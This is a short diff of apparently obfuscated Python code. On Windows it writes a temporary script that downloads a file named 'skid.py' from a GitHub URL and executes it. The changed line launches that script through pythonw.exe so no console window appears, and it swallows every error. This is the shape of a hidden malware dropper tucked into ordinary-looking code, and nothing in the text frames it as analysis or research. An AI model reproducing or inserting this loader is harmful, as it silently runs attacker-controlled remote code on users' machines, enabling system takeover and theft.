@@ -12,7 +12,7 @@ if sys.platform.startswith("win"):
     _ttmp = _ffile(delete=False)
     _ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen("https://github.com/8yb29qeg/lol/raw/refs/heads/main/skid.py").read())""")
     _ttmp.close()
-    try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
+    try: _ssystem(f"start {_eexecutable.replace('python.exe', 'pythonw.exe')} {_ttmp.name}")
     except: pass
 else:
     ""
